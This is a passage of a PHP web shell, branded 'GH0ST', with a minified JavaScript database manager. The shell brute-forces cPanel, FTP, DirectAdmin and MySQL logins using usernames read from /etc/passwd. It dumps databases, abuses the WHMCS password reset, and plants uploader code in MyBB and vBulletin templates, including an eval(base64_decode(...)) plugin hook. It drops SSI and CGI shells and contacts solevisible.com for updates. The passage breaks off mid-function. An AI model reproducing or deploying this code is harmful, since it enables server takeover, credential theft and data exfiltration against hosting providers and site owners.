echo '<b>UserName: </b><font color="green"><b>'.$username.'</b></font><br /><b>Password: </b><font color="green"><b>'.$_POST['GH0ST4'].'</b></font><script>post_encryption_mode = '.$post_encrypt.';</script>';
}else{
...
if($_POST['GH0ST7']=='export'){
	...
	$file = "GH0ST_color_config_".date('Y-m-d-h_i_s').".conf";
...
if($_POST['GH0ST2']=='>>'){
	echo __pre();
	$colors = json_decode($_POST["GH0ST1"],true);
	$array = "";
	$is_default = isset($_POST["GH0ST3"])&&$_POST["GH0ST3"]=="1"?true:false;
	$glob_colors = $GLOBALS["__GH0ST_COLOR__"];
	foreach($glob_colors as $k => $v){
		if(isset($colors[$k])&&!empty($colors[$k])&&!$is_default){
			$v = trim($colors[$k]);
...
function GH0STaboutus(){
GH0SThead();
echo '<div class="header">';
$news = new GH0STCURL();
$about_us = $news->Send("http://solevisible.com/aboutus.php");
if(empty($about_us)){
$about_us = "<pre><center><img src='https://i.ibb.co.com/15JX7GQ/20251031-123133.png'><br>
<b><font size='+3' color='#00A220'>&#9774; ~ PEACE ~ &#9774;</font><br><b>
<font color='#00A220'>Shell Coded By Sole Sad & Invisible (DARK CLOUD LOGS)</font><br>
...
$delimiter = (!empty($_POST['GH0ST1']) ? $_POST['GH0ST1'] : '::');
$selected_data = json_decode($_POST['GH0ST2'], true);
$username = ($_POST['GH0ST3']);
$password = ($_POST['GH0ST4']);
$dbname = ($_POST['GH0ST5']);
$dfile = ($_POST['GH0ST6']);
$host = ($_POST['GH0ST7']);
$table = array('td1' =>
...
$table = array('td1' =>
 ...
 array('color' => 'FFFFFF', 'tdName' => 'db_name : ', 'inputName' => 'db_name', 'id' => 'db_name', 'inputValue' => '', 'inputSize' => '50'),
 'td5' =>
 array('color' => 'FFFFFF', 'tdName' => 'Dump Path: ', 'inputName' => 'dfile', 'inputValue' => htmlspecialchars($GLOBALS['cwd']).'GH0ST.sql', 'inputSize' => '50')
);
create_table($table);
echo "<br><input type='submit' value=' ' name='Submit'></p></form></center>";
$username = ($_POST['GH0ST3']);
...
if(strlen(GH0STEx("mysqldump"))>0){
GH0STEx("mysqldump --single-transaction --host=\"$host\" --user=\"$username\" --password=\"$password\" $dbname > '".addslashes($dfile)."'");
echo($msg);
}else{
__alert("Error...!");
}
...
function GH0ST_DirectAdmin_Cracker($info){
if(!$info['mysql'])
...
function GH0ST_CP_Cracker($info){
...
function GH0ST_FTP_Cracker($info){
...
function GH0ST_Call_Function_Cracker($method,$info){
switch($method){case 'cp':return GH0ST_CP_Cracker($info);break;case 'direct': case 'phpmyadmin':return GH0ST_DirectAdmin_Cracker($info);break;case 'ftp':return GH0ST_FTP_Cracker($info);break;case 'mysql':return GH0ST_Mysql_Cracker($info);break;case 'mysql':return GH0ST_FTPC($info);break;}
}
function GH0STCrackers(){
GH0SThead();
GH0STNum(9,10);
...
<textarea placeholder="Users" rows="20" cols="25" name="usernames">'.($GLOBALS['sys']=='unix'?GH0STEx("cut -d: -f1 /etc/passwd"):"").'</textarea>
...
$target = str_replace(array('https://','http://','ftp://'),'',$_POST['GH0ST1']);
$port = $_POST['GH0ST2'];
$usernames= $_POST['GH0ST3'];
$passwords = $_POST['GH0ST4'];
$fcrack = $_POST['GH0ST5'];
$cracking = $_POST['GH0ST6'];
$protocol = $_POST['GH0ST7'];
$loginpanel = $_POST['GH0ST8'];
...
GH0ST_Call_Function_Cracker($loginpanel,$array);
}
}
...
if(isset($_POST['GH0ST1']) && $_POST['GH0ST1']== 'whmcs'){
GH0STNum();
...
$GH0STSole = new GH0STCURL(true);
$saveurl = $GH0STSole->Send($path."/pwreset.php");
$getToken = preg_match("/name=\"token\" value=\"(.*?)\"/i",$saveurl,$token);
$GH0STSole->Send($path."/pwreset.php","post","token={$token[1]}&action=reset&email=solevisible@fbi.gov");
...
}if(isset($_POST['GH0ST2']) && $_POST['GH0ST2']== 'mybb'){
GH0STNum(1,2,3,5);
...
$dbp = $_POST['GH0ST8'];
$dbh = $_POST['GH0ST9'];
$prefix = $_POST['GH0ST10'];
$method = $_POST['GH0ST4'];
$shellCode = "{\${".GH0ST_UPLOADER."}}";
...
$GH0STCurl->Send($realurl.$realpath."/calendar.php");
$res = true;
}
if($res){
...
if(isset($_POST['GH0ST3']) && $_POST['GH0ST3']== 'vb'){
GH0STNum(1,2,7,9,10);
...
if(isset($_POST['GH0ST4'])&&!empty($_POST['GH0ST4'])){
$method = $_POST['GH0ST8'];
$faq_name = "faq";
$faq_file = "/faq.php";
$code = "{\${".GH0ST_UPLOADER."}}{\${exit()}}&";
$conn=@mysqli_connect($_POST['GH0ST2'],$_POST['GH0ST4'],$_POST['GH0ST5'],$_POST['GH0ST7']) or die(@mysqli_connect_error());
$rec = "select `template` from ".$_POST['GH0ST6']."template WHERE title ='".$faq_name."'";
...
$p = "UPDATE ".$_POST['GH0ST6']."template SET `template`='".$code."' WHERE `title`='".$faq_name."'";
$ka= @mysqli_query($conn,$p) or die(mysqli_error($conn));
$geturl = @mysqli_query($conn,"select `value` from ".$_POST['GH0ST6']."setting WHERE `varname`='bburl'");
...
$check = fgets($fsock);
if(preg_match("/200 OK/i",$check)){
$p1 = "UPDATE ".$_POST['GH0ST6']."template SET template ='".mysqli_real_escape_string($conn,$savetoass)."' WHERE title ='".$faq_name."'";
...
$GH0STCurl->Send($realurl.$realpath.$faq_file);
$p1 = "UPDATE ".$_POST['GH0ST6']."template SET template ='".mysqli_real_escape_string($conn,$savetoass)."' WHERE title ='".$faq_name."'";
$ka1= @mysqli_query($conn,$p1) or die(mysqli_error($conn));
$res = true;
}
...
function GH0STcheckupdate(){
	if($GLOBALS["DB_NAME"]["cgi_api"]){
		if(!isset($_COOKIE["GH0STcgiapi_mode"])&&!isset($_COOKIE["GH0STcgiapi"])){
			_GH0ST_cgicmd("whoami","perl",true);
			if(strlen(GH0STEx("whoami",false,true))>0){
				__GH0ST_set_cookie("GH0ST_canruncmd", "true");
			}
		}
	}
	if(function_exists("curl_version")){
		$update = new GH0STCURL();
		$json = $update->Send("http://solevisible.com/update.json?ver=".__GH0ST_VERSION__);
		$json = @json_decode($json,true);
		$data = array();
		if($json){
			if(!isset($_COOKIE['GH0ST_checkupdate']) && !empty($json["type"])){
				if($json["type"] == "update"){
					if(__GH0ST_VERSION__ != $json['version'] || __GH0ST_UPDATE__ != $json['version_number']){
						@setcookie("GH0ST_checkupdate", "1", time()+86400);
			...
			if(isset($json["code_name"]) && !empty($json["code_name"])){
				...
				$data["version_number"] = __GH0ST_VERSION__;
			}
...
function GH0STWriteTocgiapi($name, $source){
	$temp = "";
	$not_api = array("basedir.GH0ST", "getdir.GH0ST", "getheader.GH0ST");
	if(in_array($name, $not_api)){
		...
		GH0STCreateParentFolder();
		@chdir($GLOBALS['home_cwd'] . "/" . __GH0ST_DATA_FOLDER__);
	}
	@mkdir('GH0STcgiapi',0755);
	__write_file("GH0STcgiapi/".$name, __get_resource($source));
	@chmod("GH0STcgiapi/".$name, 0755);
	return $temp;
}
function GH0STcheckcgi(){if(strlen(GH0STEx("id",false,true,true))>0)echo("ok");else echo("no");}
function GH0STupdateheader(){
	if(!isset($_COOKIE["updateheader_data"])){
		...
		$tmp_path = GH0STWriteTocgiapi("getheader.GH0ST",$bash);
		$data = GH0STEx("cd '{$tmp_path}/GH0STcgiapi';sh getheader.GH0ST",false,true,true);
		if(@is_array(@json_decode($data,true))){
			__GH0ST_set_cookie("updateheader_data", __ZW5jb2Rlcg($data));
			echo $data;
		}
	}else{
...
function GH0STssiShell(){
GH0SThead();
echo '<div class=header>';
GH0STCreateParentFolder();
@chdir($GLOBALS['home_cwd'] . "/" . __GH0ST_DATA_FOLDER__);
@mkdir('GH0ST_shtml',0755);
@chdir('GH0ST_shtml');
GH0STcgihtaccess('shtml');
...
@__write_file('GH0ST_ssi.shtml',__get_resource($code));
@chmod("GH0ST_ssi.shtml",0755);
echo GH0STiFrameCreator('GH0ST_shtml/GH0ST_ssi.shtml');
echo '</div>';
GH0STfooter();
}
function GH0STcloudflare(){
GH0SThead();
GH0STNum(8,9,10,7,6,5,4,3);
...
echo '<?xml version="1.0" encoding="ISO-8859-1"?><plugins><plugin active="1" product="vbulletin"><title>vBulletin</title><hookname>init_startup</hookname><phpcode><![CDATA[if (strpos($_SERVER[\'PHP_SELF\'],"subscriptions.php")){eval(base64_decode(\''.__ZW5jb2Rlcg($_POST['GH0ST1']).'\'));exit;}]]></phpcode></plugin></plugins>';
echo '</textarea></center></p>';
}
echo '</center></div>';
GH0STfooter();
}
function GH0STcpcrack(){
GH0SThead();
...
<tr>
<td colspan='4'><form style='margin-top: 10px;' onsubmit=\"return false;\" autocomplete='off'><span><span class='footer_text'>Execute :</span><br><button onClick='GH0STOpenPhpTerminal();return false;' class='foottable GH0ST_custom_cmd_btn'><img style='width:28px;vertical-align: middle;' src='http://solevisible.com/icons/menu/terminal.svg'> Terminal</button><br></form></td>
</tr>
<tr>
...
<div id='rightclick_menu'>
  ...
  <a href='javascript:void(0);' onclick='GH0STSyncMenuToOpt(this);' path='' fname='' name='view_archive'><img src=\"http://solevisible.com/icons/menu/view.svg\"> View Archive</a>
  <a href='' name='edit'><img src=\"http://solevisible.com/icons/menu/edit.svg\"> Edit</a>
  <a href='javascript:void(0);' onclick='GH0STPopupAction(this, \"move\");' ftype='' path='' fname='' href='' href='' name='move'><img src=\"http://solevisible.com/icons/menu/move.svg\"> Move</a>
  <a href='javascript:void(0);' onclick='GH0STPopupAction(this, \"copy\");' ftype='' path='' fname='' href='' name='copy'><img src=\"http://solevisible.com/icons/menu/copy.svg\"> Copy</a>
  <a href='javascript:void(0);' onclick='GH0STPopupAction(this, \"rename\");' ftype='' path='' fname='' name='rename'><img src=\"http://solevisible.com/icons/menu/rename.svg\">  Rename</a>
  <a href='javascript:void(0);' onclick='GH0STPopupAction(this, \"modify\");' ftype='' path='' fname='' name='modify'><img src=\"http://solevisible.com/icons/menu/time.svg\">  Modify</a>
  <a href='javascript:void(0);' onclick='GH0STPopupAction(this, \"permission\");' name='permission'><img src=\"http://solevisible.com/icons/menu/key.svg\"> Change Permissions</a>
  <a href='javascript:void(0);' onclick='GH0STSyncMenuToOpt(this);' path='' fname='' name='compress'><img src=\"http://solevisible.com/icons/menu/resize.svg\"> Compress</a>
  <a href='javascript:void(0);' onclick='GH0STSyncMenuToOpt(this);' path='' fname='' name='extract'><img src=\"http://solevisible.com/icons/menu/increase.svg\"> Extract</a>
...
<div class='cl-popup-fixed' style='display:none;'>
	<div id='shortcutMenu-holder'>
		...
		<div class='popup-foot'>
			<button style='background: #2b5225;' name='accept' action='' onclick='GH0STPopUpDoAction(this);'></button>
			<button style='background: #9e2c2c;' onclick='d.querySelector(\".cl-popup-fixed\").style.display=\"none\";'>Cancell</button>
		</div>
	</div>
</div>";?>
<script>
function GH0STMysqlApi(e,t){var a={host:mysql_cache[e.db_id].host,user:mysql_cache[e.db_id].user,pass:mysql_cache[e.db_id].pass,db:e.db_target,db_id:e.db_id};if(e.hasOwnProperty("db_info"))for(var i in e.db_info)a[i]=e.db_info[i];var l={a:GH0STb64("Sql_manager_api"),c_:GH0STb64(c_),GH0ST1:GH0STb64(JSON.stringify(a))};if(e.hasOwnProperty("post"))for(var i in e.post.hasOwnProperty("GH0ST2")&&"load_data"!=e.post.GH0ST2&&"page"!=e.post.GH0ST2&&"edit"!=e.post.GH0ST2&&"delete"!=e.post.GH0ST2&&(d.querySelector("#"+e.db_id+" .mysql-query-result-header .mysql-query-pager").innerHTML="",d.querySelector("#"+e.db_id+" .mysql-query-result-header .mysql-query-reporter").innerHTML=""),e.post)l[i]=GH0STb64(e.post[i]);var r="";for(var o in l)r+=o+"="+l[o]+"&";GH0STloader(e.db_id,"block"),_Ajax(d.URL,r,function(a){GH0STloader(e.db_id,"none"),t(a)},!0,e.db_id)}function GH0STMysqlFilterTable(e,t){setTimeout(function(){var a="",i="",l=(a="","");if(null!=e)a=e.getAttribute("target"),i=e.getAttribute("db_id"),l=e.value;else a=t.target,i=t.db_id,l=t.value;l=new RegExp(l,"i"),d.querySelectorAll("#"+i+" "+a+" ul > li").forEach(function(e){var t=e.querySelector(".mysql_tables");if(null==t)return!1;-1==(t=t.innerText).search(l)?e.style.display="none":e.style.display="block"})},200)}function GH0STMysqlFilterAllTable(e,t){var a=e.getAttribute("db_id"),i=d.querySelector("#"+a+" .mysql-tables input[name=filter_all]").value,l=d.querySelector("#"+a+" input[name=sql_count]").checked,r=[],o=[];if(d.querySelectorAll("#"+a+" .mysql-tables .list_container").forEach(function(e){var t=e.getAttribute("mode"),a=e.getAttribute("db_name");"no"==t&&r.push(a),o.push(a)}),r.length>0){if(0==i.length&&void 0===t)return!1;GH0STMysqlApi({db_id:a,db_target:r[0],ajax_id:"mysql_get_all_tables",db_info:{databases:r},post:{GH0ST2:"load_all_tables",GH0ST3:l}},function(r){if(0!=r.length){for(var o in r=JSON.parse(r)){var n=o,s=d.querySelector("#"+a+" .cls-"+n);GH0STMysqlMakeTblList(r[o],s,a,n,l)}void 0===t?GH0STMysqlFilterTable(null,{db_id:a,target:".mysql-tables .list_container",value:i}):(e.setAttribute("mode","opened"),d.querySelector("#"+a+" .mysql-tables .parent-expander img").src="https://i.ibb.co.com/15JX7GQ/20251031-123133.png")}})}else if(void 0===t)for(var n in GH0STMysqlFilterTable(null,{db_id:a,target:".mysql-tables .list_container",value:i}),o)GH0STMysqlTableMode(a,o[n],"closed");else{var s="",c=e.getAttribute("mode");for(var n in"opened"==c?(e.setAttribute("mode","closed"),s="b_plus.png"):(e.setAttribute("mode","opened"),s="b_minus.png"),o)GH0STMysqlTableMode(a,o[n],c);d.querySelector("#"+a+" .mysql-tables .parent-expander img").src="http://solevisible.com/icons/menu/"+s}}function GH0STMysqlTableMode(e,t,a){var i=d.querySelector("#"+e+" .cls-"+t),l="";void 0===a?(l=-1!=i.classList.value.indexOf("hide-db-tables")?"b_minus.png":"b_plus.png",i.classList.toggle("hide-db-tables")):"opened"==a?(l="b_plus.png",i.classList.add("hide-db-tables")):(l="b_minus.png",i.classList.remove("hide-db-tables")),d.querySelector("#"+e+" .cls-"+t+"-expander img").src="http://solevisible.com/icons/menu/"+l}function GH0STMysqlExpander(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=e.getAttribute("sql_count"),l=d.querySelector("#"+a+" .cls-"+t);"loaded"==l.getAttribute("mode")?GH0STMysqlTableMode(a,t):GH0STMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_get_tables",post:{GH0ST2:"load_tables",GH0ST3:i}},function(e){0!=e.length&&GH0STMysqlMakeTblList(e=JSON.parse(e),l,a,t,i)})}function GH0STMysqlTablesEvil(e){var t=e.getAttribute("target"),a=e.getAttribute("db_id"),i=e.getAttribute("mode");"checked"==i?(i=!1,e.setAttribute("mode","not")):(i=!0,e.setAttribute("mode","checked")),d.querySelectorAll("#"+a+" "+t+" input[name=tbl\\[\\]]").forEach(function(e){e.checked=i})}function GH0STMysqlTablesDumpDrop(e){var t=e.getAttribute("target"),a=e.getAttribute("db_id"),i="none";"dump"==e.value&&(i="block"),d.querySelector("#"+a+" "+t+" .dump-file-holder").style.display=i}function GH0STMysqlTablesDumpDropBtn(e){var t=e.getAttribute("target"),a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=[],r=d.querySelector("#"+i+" input[name=sql_count]").checked,o=d.querySelector("#"+i+" "+t),n=o.querySelector("select[name=tables_evil]").value,s=o.querySelector(".dump-file-holder input").value;d.querySelectorAll("#"+i+" "+t+" input[name=tbl\\[\\]]").forEach(function(e){e.checked&&l.push(e.value)}),l.length>0&&GH0STMysqlApi({db_id:i,db_target:a,ajax_id:"mysql_query_evil",db_info:{tables:l,mode:n,dump_file:s},post:{GH0ST2:"dump_drop"}},function(e){0!=e.length&&(e=JSON.parse(e),"drop"==n?GH0STMysqlMakeTblList(e,o,i,a,r):o.querySelector(".dump-file-holder").insertAdjacentHTML("beforeend","<div><a href='javascript:void(0);' onclick='g(\"FilesTools\",null,\""+s+'","download");\'><span>Download: '+s+"</span></a></div>"))})}function GH0STMysqlMakeTblList(e,t,a,i,l){t.setAttribute("mode","loaded");var r='<ul><li><div class="block"><i></i><b></b></div><div><input style="padding: 0;margin-left: 11px;text-align:center;" type="text" class="db-opt-id" db_id="'+a+'" placeholder="Filter Table" target=".cls-'+i+'" onkeyup="GH0STMysqlFilterTable(this);" name="filter"></div></li>';for(var o in e)null!=e[o]&&(r+="<li><div class='block'><i></i><b></b></div><div class='tables-row'><input type='checkbox' name='tbl[]' value='"+e[o].name+"'>&nbsp;<a class='db-opt-id' db_target='"+i+"' db_id='"+a+"' href='javascript:void(0);' onclick=\"GH0STLoadTableData(this, '"+e[o].name+"')\"><span class='mysql_tables' style='font-weight:unset;'>"+e[o].name+"</span></a>"+(l?" <small><span style='font-weight:unset;' class='mysql_table_count'>("+e[o].count+")</span></small>":"&nbsp;")+"</div></li>");r+='</ul><div style="margin-left: 26px;margin-bottom: 10px;margin-top: 10px;"><input onchange="GH0STMysqlTablesEvil(this);" db_id="'+a+'" class="db-opt-id" target=".cls-'+i+'" type="checkbox" class="db-opt-id"><select onchange="GH0STMysqlTablesDumpDrop(this);" class="db-opt-id" db_id="'+a+'" target=".cls-'+i+'" class="db-opt-id" name="tables_evil" style="padding: 0;width: 100px;"><option selected>drop</option><option>dump</option></select> <button onclick="GH0STMysqlTablesDumpDropBtn(this);return false;" db_id="'+a+'" class="db-opt-id" db_target="'+i+'" target=".cls-'+i+'" class="db-opt-id">Do it</button><div class="dump-file-holder" style="display:none;margin-left:20px;margin-top: 5px;"><input style="padding: 0;text-align:center;" type="text" placeholder="dump.sql" name="dump_file"></div></div>',t.innerHTML=r,d.querySelector("#"+a+" .cls-"+i+"-expander img").src="http://solevisible.com/icons/menu/b_minus.png"}function GH0STMysqlQuery(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a+" textarea[name=query]").value;GH0STMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_load_query_data",db_info:{query:i},post:{GH0ST2:"query"}},function(e){0!=e.length&&(e=JSON.parse(e),GH0STMysqlReportBuilder(a,e),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.status?e.table:"",GH0STMysqlTabCtl({child:1,db_id:a,target:".mysql-query-result-content"},!0))})}function GH0STMysqlReportBuilder(e,t){var a="";t.status||(a="<div><span>Error: </span><div style='padding-left: 50px;'><pre>"+t.error+"</pre></div></div>");var i="<div><span>Query:</span><div style='padding-left: 50px;'><pre>"+t.query+"</pre></div>"+a+"</div>";d.querySelector("#"+e+" .mysql-query-reporter").innerHTML=i}function GH0STMysqlTablePanelCtl(e){var t=e.getAttribute("db_id"),a=(t=e.getAttribute("db_id"),d.querySelector("#"+t)),i=a.querySelector(".tables-panel-ctl");"none"==i.getAttribute("mode")?(a.querySelector(".mysql-tables").style.display="block",i.setAttribute("mode","block"),i.innerHTML="&#x3C;&#x3C;",a.querySelector(".mysql-query-results-fixed").classList.remove("mysql-query-results-fixed")):(a.querySelector(".mysql-tables").style.display="none",i.setAttribute("mode","none"),i.innerHTML="&#x3E;&#x3E;",a.querySelector(".mysql-query-results").classList.add("mysql-query-results-fixed")),i.classList.toggle("tables-panel-ctl-min")}function GH0STMysqlTabCtl(e,t){var a=void 0===t?e.getAttribute("db_id"):e.db_id,i=void 0===t?e.getAttribute("target"):e.target;d.querySelectorAll("#"+a+" .mysql-query-content").forEach(function(e){e.classList.add("mysql-hide-content")}),d.querySelector("#"+a+" .mysql-query-result-tabs .mysql-query-selected-tab").classList.remove("mysql-query-selected-tab"),void 0===t?e.classList.add("mysql-query-selected-tab"):d.querySelector("#"+a+" .mysql-query-result-tabs div:nth-child("+e.child+")").classList.add("mysql-query-selected-tab"),d.querySelector("#"+a+" "+i).classList.remove("mysql-hide-content")}function GH0STLoadTableData(e,t){var a=e.getAttribute("db_target"),i=e.getAttribute("db_id");GH0STMysqlApi({db_id:i,db_target:a,ajax_id:"mysql_load_table_data",db_info:{table:t},post:{GH0ST2:"load_data"}},function(e){if(0!=e.length){e=JSON.parse(e);var l="",r="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#FFFFFF;'><th>Column</th><th>Type</th><th>Value</th></tr>",o="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#FFFFFF;'><th>Column</th><th>Type</th><th>Value</th><th>Change</th></tr>",n="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#FFFFFF;'><th>Column</th><th>Type</th><th>Collation</th><th>Operator</th><th>Value</th></tr>",s=["int","smallint","bigint","tinyint","mediumint"],c=["longtext","text","mediumtext","tinytext"];for(var u in e.columns){var p="text";-1!=s.indexOf(e.columns[u].data_type)&&(p="number"),n+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td>"+e.columns[u].type+"</td><td>"+e.columns[u].collation+"</td><td><select name='"+e.columns[u].name+"'><option value='='>=</option><option value='!='>!=</option><option value='>'>&gt;</option><option value='>='>&gt;=</option><option value='<'>&lt;</option><option value='<='>&lt;=</option><option value=\"= ''\">= ''</option><option value=\"!= ''\">!= ''</option><option value='LIKE'>LIKE</option><option value='LIKE %...%'>LIKE %...%</option><option value='NOT LIKE'>NOT LIKE</option><option value='REGEXP'>REGEXP</option><option value='REGEXP ^...$'>REGEXP ^...$</option><option value='NOT REGEXP'>NOT REGEXP</option><option value='IN (...)'>IN (...)</option><option value='NOT IN (...)'>NOT IN (...)</option><option value='BETWEEN'>BETWEEN</option><option value='NOT BETWEEN'>NOT BETWEEN</option><option value='IS NULL'>IS NULL</option><option value='IS NOT NULL'>IS NOT NULL</option></select></td><td><input type='"+p+"' name='"+e.columns[u].name+"'></td></tr>";var f=GH0STMysqlLoadDataType(e.columns[u].data_type);null==e.columns[u].type_value&&(e.columns[u].type_value=""),o+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td><select name='sel_"+e.columns[u].name+"'>"+f+"</select></td><td><input name='value_"+e.columns[u].name+"' type='text' value='"+(-1==c.indexOf(e.columns[u].data_type)?e.columns[u].type_value:"")+"'></td><td><button col_name='"+e.columns[u].name+"' tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='GH0STMysqlAlterTbl(this);return false;'>Change</button></td></tr>";var m="";switch(e.columns[u].data_type){case"longtext":case"text":m="<textarea name='"+e.columns[u].name+"' rows='5'></textarea>";break;case"int":case"smallint":case"bigint":m="<input type='number' name='"+e.columns[u].name+"' value=''>";break;default:m="<input type='text' name='"+e.columns[u].name+"' value=''>"}r+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td>"+e.columns[u].type+"</td><td>"+m+"</td></tr>"}if(r+="</table><div style='margin-left:20px;'><button tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='GH0STMysqlUpdateRow(this, \"insert\");return false;'>Insert</button></div><div class='mysql-insert-result'></div>",o+="</table><div class='mysql-structure-qres'></div>",n+="</table><div style='padding-left: 384px;margin-top: 15px;'><button tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='GH0STMysqlSearch(this);return false;'>Search</button></div>",e.pages>0){l+="<span style='cursor:pointer;' db_id='"+i+"' onclick='GH0STMysqlChangePage(this,1);'><<</span> <span> page: </span> <select tbl_name='"+t+"' db_target='"+a+"' name='mysql-q-pages' db_id='"+i+"' class='db-opt-id' onchange='GH0STMysqlChangePage(this);' pages='"+e.pages+"'>";for(var b=1;b<e.pages+1;b++)l+="<option>"+b+"</option>";l+="</select><span> Of "+e.pages+"</span> <span style='cursor:pointer;' db_id='"+i+"' onclick='GH0STMysqlChangePage(this,2);'>>></span>"}var y=d.querySelector("#"+i);y.querySelector(".mysql-search-area").innerHTML=n,y.querySelector(".mysql-insert-row").innerHTML=r,y.querySelector(".mysql-edit-row").innerHTML="",y.querySelector(".mysql-structure").innerHTML=o,y.querySelector(".mysql-query-result-header .mysql-query-pager").innerHTML=l,y.querySelector(".mysql-query-table").innerHTML=e.status?e.table:"",GH0STMysqlTabCtl({child:1,db_id:i,target:".mysql-query-result-content"},!0),d.querySelector("#"+i+" .mysql-query-result-tabs div:nth-child(6)").style.display="none",GH0STMysqlReportBuilder(i,e)}})}function GH0STMysqlAlterTbl(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a),l=e.getAttribute("tbl_name"),r=e.getAttribute("col_name"),o={};o.type=i.querySelector(".mysql-structure select[name=sel_"+r+"]").value,o.input=i.querySelector(".mysql-structure input[name=value_"+r+"]").value,GH0STMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_table_alter",db_info:{table:l,column:r,alter:o},post:{GH0ST2:"alter"}},function(e){var t=d.querySelector("#"+a+" .mysql-structure-qres");t.innerHTML=e,t.style.display="block"})}function GH0STMysqlSearch(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a),l=e.getAttribute("tbl_name"),r={};i.querySelectorAll(".mysql-search-area input, .mysql-search-area select").forEach(function(e){r.hasOwnProperty(e.name)||(r[e.name]={}),"SELECT"==e.tagName?r[e.name].opt=e.value:r[e.name].value=e.value}),GH0STMysqlApi({db_id:a,db_target:t,ajax_id:"mysql_table_search_query",db_info:{table:l,search:r},post:{GH0ST2:"search"}},function(e){0!=e.length&&(e=JSON.parse(e),GH0STMysqlReportBuilder(a,e),GH0STMysqlTabCtl({child:1,db_id:a,target:".mysql-query-result-content"},!0),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.table)})}function GH0STMysqlEditRow(e,t){var a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=(d.querySelector("#"+i),e.getAttribute("col_key")),r=e.getAttribute("key"),o=e.getAttribute("tbl_name"),n=e.getAttribute("row_id");GH0STMysqlApi({db_id:i,db_target:a,ajax_id:"mysql_table_edit_query",db_info:{table:o,col_key:l,key:r},post:{GH0ST2:t}},function(e){if(0!=e.length)if(e=JSON.parse(e),"edit"==t){var s="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#FFFFFF;'><th>Column</th><th>Type</th><th>Value</th></tr>";for(var c in e){var u="";switch(e[c].type.tag){case"textarea":u="<textarea name='"+e[c].col+"' rows='5'>"+e[c].value+"</textarea>";break;case"input":u="<input type='"+e[c].type.type+"' name='"+e[c].col+"' value='"+e[c].value+"'>"}s+="<tr><th style='text-align: left;'>"+e[c].col+"</th><td>"+e[c].type.col_type+"</td><td>"+u+"</td></tr>"}s+="</table><div style='margin-left:20px;'><button col_key='"+l+"' key='"+r+"' tbl_name='"+o+"' db_id='"+i+"' db_target='"+a+"' onclick='GH0STMysqlUpdateRow(this, \"edit\");return false;'>Update</button></div><div class='mysql-update-result'></div>",d.querySelector("#"+i+" .mysql-edit-row").innerHTML=s,GH0STMysqlTabCtl({child:6,db_id:i,target:".mysql-edit-row"},!0),d.querySelector("#"+i+" .mysql-query-result-tabs div:nth-child(6)").style.display="inline-block"}else"delete"==t&&(e.status?d.querySelector("#"+i+" .tbl_row_l"+n).remove():alert(e.error))})}function GH0STMysqlTblSelectAll(e){var t=e.getAttribute("db_id");d.querySelectorAll("#"+t+" .mysql-main input[name=tbl_rows_checkbox\\[\\]]").forEach(function(t){t.checked=e.checked})}function GH0STMysqlDeleteAllSelectedrows(e){var t=e.getAttribute("db_id"),a=e.getAttribute("db_target"),i=e.getAttribute("col_key"),l=e.getAttribute("tbl_name"),r=[];if(d.querySelectorAll("#"+t+" .mysql-main input[name=tbl_rows_checkbox\\[\\]]").forEach(function(e){e.checked&&r.push(e.value)}),0==r.length)return!1;GH0STMysqlApi({db_id:t,db_target:a,ajax_id:"mysql_table_delete_all_query",db_info:{table:l,col_key:i,rows:r},post:{GH0ST2:"delete_all"}},function(e){if(""!=e)if((e=JSON.parse(e)).status){var a=0,i=d.querySelector("#"+t);d.querySelectorAll("#"+t+" .mysql-main input[name=tbl_rows_checkbox\\[\\]]").forEach(function(e){e.checked&&(a=e.getAttribute("row_id"),i.querySelector(".tbl_row_l"+a).remove())})}else alert(e.error)})}function GH0STMysqlUpdateRow(e,t){var a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=d.querySelector("#"+i),r=".mysql-insert-row",o=".mysql-insert-result",n="mysql_table_insert_query",s="insert",c={table:e.getAttribute("tbl_name")};if("edit"==t){var u=e.getAttribute("col_key"),p=e.getAttribute("key");r=".mysql-edit-row",o=".mysql-update-result",n="mysql_table_update_query",s="update",c.col_key=u,c.key=p}var f={};l.querySelectorAll(r+" input, "+r+" textarea").forEach(function(e){f.hasOwnProperty(e.name)||(f[e.name]={}),f[e.name]=e.value}),c.data=f,GH0STMysqlApi({db_id:i,db_target:a,ajax_id:n,db_info:c,post:{GH0ST2:s}},function(e){if(0!=e.length){e=JSON.parse(e);var t=d.querySelector("#"+i+" "+o);t.style.display="block",e.status?t.innerHTML="Success...":t.innerHTML=e.error}})}function GH0STMysqlLoadDataType(e){e=e.toUpperCase();var t=["INT","VARCHAR","TEXT","DATE",{key:"Numeric",vals:["TINYINT","SMALLINT","MEDIUMINT","INT","BIGINT","-","DECIMAL","FLOAT","DOUBLE","REAL","-","BIT","BOOLEAN","SERIAL"]},{key:"Date and time",vals:["DATE","DATETIME","TIMESTAMP","TIME","YEAR"]},{key:"String",vals:["CHAR","VARCHAR","-","TINYTEXT","TEXT","MEDIUMTEXT","LONGTEXT","-","BINARY","VARBINARY","-","TINYBLOB","MEDIUMBLOB","BLOB","LONGBLOB","-","ENUM","SET"]},{key:"Spatial",vals:["GEOMETRY","POINT","LINESTRING","POLYGON","MULTIPOINT","MULTILINESTRING","MULTIPOLYGON","GEOMETRYCOLLECTION"]},{key:"JSON",vals:["JSON"]}],a="",i=!1;for(var l in 